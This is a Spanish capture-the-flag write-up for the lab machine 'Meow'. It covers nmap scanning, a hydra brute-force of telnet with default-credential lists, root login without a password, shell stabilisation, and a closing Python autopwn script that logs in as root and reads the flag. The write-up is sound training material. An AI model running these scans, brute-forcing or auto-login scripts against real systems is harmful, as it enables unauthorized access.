# Meow

🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.194.222

PING 10.129.194.222 (10.129.194.222) 56(84) bytes of data.
64 bytes from 10.129.194.222: icmp_seq=1 ttl=63 time=2105 ms

--- 10.129.194.222 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2105.123/2105.123/2105.123/0.000 ms
```

> Sistema operativo:  **Linux**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vv 10.129.194.222 -oG openPorts

PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 23 -sCV 10.129.194.222 -oN targeted

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión       |
| ------ | -------- | ------------- |
| 23     | telnet   | Linux telnetd |

¿Qué es telnet?  
[**RFC**](https://www.rfc-es.org/rfc/rfc0854-es.txt)

🗹 Buscar scripts de **nmap** relacionados al servicio **telnet**:

```shell
find /usr/share/nmap/scripts -name *telnet* 2>/dev/null

/usr/share/nmap/scripts/telnet-brute.nse
/usr/share/nmap/scripts/telnet-ntlm-info.nse
/usr/share/nmap/scripts/telnet-encryption.nse
```

🗹 Ejecutar scripts relacionados al servicio **telnet** sobre el puerto **23**:

```shell
sudo nmap -p 23 -n -Pn --script "*telnet*" 10.129.194.222
```

🗹 Establecer conexión con el servidor a través del servicio **telnet**:

```shell
telnet 10.129.194.222

Trying 10.129.194.222...
Connected to 10.129.194.222.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

🗹 Realizar ataque de fuerza bruta contra el servicio **telnet**:

```shell
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt 10.129.194.222 telnet

[DATA] attacking telnet://10.129.194.222:23/
[23][telnet] host: 10.129.194.222   login: root   password: NetLinx:password
[23][telnet] host: 10.129.194.222   login: root   password: root:calvin
[23][telnet] host: 10.129.194.222   login: root   password: user:user
[23][telnet] host: 10.129.194.222   login: root   password: localadmin:localadmin
[23][telnet] host: 10.129.194.222   login: root   password: amx:Amx1234!
[23][telnet] host: 10.129.194.222   login: root   password: root:default
[23][telnet] host: 10.129.194.222   login: root   password: amx:password
[23][telnet] host: 10.129.194.222   login: root   password: administrator:Amx1234!
[23][telnet] host: 10.129.194.222   login: root   password: admin:1988
[23][telnet] host: 10.129.194.222   login: root   password: cisco:cisco
[23][telnet] host: 10.129.194.222   login: root   password: root:fidel123
[23][telnet] host: 10.129.194.222   login: root   password: Administrator:Vision2
[23][telnet] host: 10.129.194.222   login: root   password: admin:admin
[23][telnet] host: 10.129.194.222   login: root   password: Root:wago
[23][telnet] host: 10.129.194.222   login: root   password: administrator:password
[23][telnet] host: 10.129.194.222   login: root   password: Admin:wago
```

🗹 Establecer nuevamente la conexión con el servidor a través del servicio **telnet** y cuando pida loguearse ingresar el usuario **root**:

```shell
Meow login: root
```

🗹 Una vez establecida la conexión con el servidor configurar la terminal y personalizar el entorno de la terminal:

```shell
script /dev/null -c bash

ctrl + z

stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty size
stty rows 44 columns 183
```

### Root flag

La **flag** se encuentra en el directorio `/root/`:

`cat /root/flag.txt`

## Cositas aprendidas

✅ El archivo `/etc/inetd.conf` es un archivo de configuración utilizado por el demonio `inetd` en sistemas como Linux. `inetd` (abreviatura de "Internet services daemon") es un proceso que escucha en varios puertos de red para conexiones entrantes y, cuando se establece una conexión, inicia el servicio correspondiente.

```shell
cat /etc/inetd.conf

telnet stream tcp nowait telnetd /usr/sbin/tcpd /usr/sbin/in.telnetd
```

- `telnet` Es el nombre del servicio que el demonio `inetd` manejará.
- `stream` Indica el tipo de flujo de datos que maneja el servicio. En este caso, `stream` se refiere a una conexión TCP.
- `tcp`: Es el protocolo de transporte utilizado para el servicio. En este caso, es TCP (Transmission Control Protocol), que es un protocolo orientado a la conexión y confiable para la transmisión de datos.
- `nowait`: Indica que `inetd` no debe esperar a que el servicio se complete antes de aceptar nuevas conexiones. Esto significa que el servicio puede manejar múltiples conexiones simultáneamente.
- `telnetd`: Es el nombre del usuario o la cuenta bajo la cual se ejecutará el servicio.
- `/usr/sbin/tcpd`: Es el camino al demonio `tcpd` que se utilizará para controlar el acceso al servicio Telnet. `tcpd` es un demonio que proporciona seguridad y control de acceso para los servicios de red.
- `/usr/sbin/in.telnetd`: Es el path del programa que implementa el servicio Telnet en el sistema.

✅ El archivo `/etc/xinetd.d/telnet` es un archivo de configuración específico para el demonio `xinetd`, que es un super servidor de servicios de red en sistemas Unix-like, como Linux. Este archivo se utiliza para configurar y controlar cómo `xinetd` maneja el servicio Telnet.

```shell
cat /etc/xinetd.d/telnet

# default on
# description: The telnet server serves telnet sessions; it uses
# unencrypted username/password pairs for authentication.
service telnet
{
disable = no
flags = REUSE
socket_type = stream
wait = no
user = root
server = /usr/sbin/in.telnetd
log_on_failure += USERID
}
```

- `# default on`: Este comentario indica que el servicio Telnet está habilitado de manera predeterminada.
- `# description: The telnet server serves telnet sessions; it uses...`: Este comentario proporciona una descripción del servicio Telnet.
- `service telnet`: Esto indica que se está configurando el servicio Telnet.
- `disable = no`: Esta línea indica que el servicio Telnet está habilitado (`no` significa deshabilitado).
- `flags = REUSE`: Establece la bandera `REUSE`, que permite al servicio utilizar la misma dirección y puerto incluso si el servicio se ha detenido recientemente. Esto puede ayudar a mejorar la eficiencia en ciertas situaciones.
- `socket_type = stream`: Especifica que el tipo de socket es `stream`, lo que significa que el servicio utiliza conexiones TCP.
- `wait = no`: Indica que `xinetd` no debe esperar a que el servicio Telnet se complete antes de aceptar nuevas conexiones. Esto significa que el servicio puede manejar múltiples conexiones simultáneamente.
- `user = root`: Especifica el usuario bajo el cual se ejecutará el servicio Telnet. En este caso, se ejecutará como el usuario root.
- `server = /usr/sbin/in.telnetd`: Especifica la ubicación del programa `in.telnetd`, que es el servidor Telnet que maneja las conexiones entrantes.
- `log_on_failure += USERID`: Indica que se debe registrar la información del usuario (`USERID`) en caso de fallo de inicio de sesión.
# Autopwn

```python
#!/usr/bin/env python3

import argparse
import asyncio, telnetlib3
from termcolor import colored


def get_args():

    parser = argparse.ArgumentParser(prog='Meow Autopwn')
    parser.add_argument('-t', '--target', help='Dirección IP del servidor', dest='target')
    parser.add_argument('-p', '--port', help='Puerto del servicio en el que está corriendo el servicio Telnet', type=int, dest='port')

    return parser.parse_args()


async def write_to_server(wr, txt):
    wr.write(txt)
    await wr.drain()


async def meow(target, port):
    
    reader, writer = await telnetlib3.open_connection(target, port)

    banner = await reader.readuntil(b'login: ')
    print(banner.decode('utf-8'), end='')

    await write_to_server(writer, 'root\n')

    shell = await reader.readuntil(b"#")
    print(f'\n', shell.decode('utf-8'))

    await write_to_server(writer, 'cat flag.txt\n')
    flag = await reader.readuntil(b"#")
    
    flag = flag.decode('utf-8').split('\r\n')[1]
    print(colored(f'\n[+]', 'blue'), 'Root flag:', colored(f'{flag}', 'green'), colored('[+]', 'blue'))

    writer.close()

	
if __name__ == '__main__':

    args = get_args()

    if args.target and args.port:

        print(colored('\n[+]', 'blue'), 'Meow', colored('[+]', 'blue'))
    
        asyncio.run(meow(args.target, args.port))
```

![Meow Autopwn](/Images/meow_autopwn.png)
